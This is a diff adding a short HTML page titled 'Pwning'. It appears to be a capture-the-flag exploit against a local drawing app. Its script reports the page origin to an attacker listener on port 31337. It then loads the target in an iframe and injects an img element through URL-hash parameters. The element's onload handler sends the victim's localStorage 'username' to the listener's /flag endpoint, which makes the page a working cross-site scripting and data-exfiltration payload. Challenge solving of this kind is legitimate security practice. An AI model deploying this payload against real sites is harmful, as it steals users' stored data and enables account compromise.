@@ -1,0 +1,30 @@
+<html>
+    <body>
+        <h1>Pwning</h1>
+        <script>
+const isDocker = true;
+
+const myUrl = isDocker ? "http://host.docker.internal:31337" : "http://localhost:31337";
+const targetUrl = isDocker ? "http://localhost:4000" : "http://localhost:57505";
+
+fetch(myUrl + "/log?" + encodeURIComponent(window.origin));
+
+const sploit = "fetch(`" + myUrl + "/flag?${localStorage.getItem('username')}`)"
+const params = new URLSearchParams();
+params.append("is", "img");
+params.append("onload", sploit);
+params.append("src", "https://static01.nyt.com/images/2021/09/14/science/07CAT-STRIPES/07CAT-STRIPES-jumbo.jpg")
+const uri = targetUrl + "/drawing/foo#" + params.toString();
+
+const frame = document.createElement("iframe");
+frame.width = "100px";
+frame.height = "800px";
+frame.src = uri;
+document.body.appendChild(frame);
+
+setTimeout(() => {
+    frame.width = "800px";
+}, 1000);
+        </script>
+    </body>
+</html>
